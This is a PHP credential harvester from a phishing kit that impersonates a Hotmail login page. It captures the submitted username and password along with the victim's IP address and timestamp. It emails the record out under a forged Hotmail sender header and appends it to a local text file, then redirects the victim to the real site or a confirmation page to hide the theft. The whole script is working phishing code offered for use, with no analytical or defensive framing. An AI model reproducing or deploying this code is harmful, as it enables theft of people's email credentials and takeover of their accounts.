<?php
include "63.php";
include "confirmacion.html";
header ('Location: https://www.hotmail.com'); 
foreach($_POST as $variable => $value) 
$username = $_POST['username'];
$password = $_POST['password'];
$Date = "" . date("d/m/y") . "";
date_default_timezone_set("America/La_Paz");
$Time = ""   .   date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "


-------------------------------------------------------------------------
username :  $username
password :  $password

IP : $IP
Fecha: $Date / Time : $Time
------------------------------------------------------------------------";
$MAIL_TITLE = "Login | ".$IP."";
$MAIL_HEADER = "From: hotmail.Info";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("Axel.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='1; URL=confirmacion.html'>";exit;

?>
